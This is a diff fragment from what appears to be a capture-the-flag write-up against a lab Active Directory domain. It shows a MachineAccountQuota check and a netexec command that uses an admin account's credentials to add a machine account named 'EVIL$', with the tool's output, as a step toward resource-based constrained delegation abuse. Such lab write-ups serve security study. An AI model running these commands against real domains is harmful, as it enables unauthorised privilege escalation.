@@ -329,5 +329,12 @@ MAQ         10.129.86.27    389    DC01             MachineAccountQuota: 10
 The MAQ confirms i can perform RBCD
 
 ```python
-
+❯❯❯ nxc smb dc01.garfield.htb -u 'l.wilson_adm' -p 'Password123!' -M add-computer -o NAME=EVIL PASSWORD=Password123!
+SMB         10.129.86.27    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.86.27    445    DC01             [+] garfield.htb\l.wilson_adm:Password123! 
+ADD-COMP... 10.129.86.27    445    DC01             Successfully added the machine account: 'EVIL$' with Password: 'Password123!'
 ```
+
+Then ill add a machine account
+
+
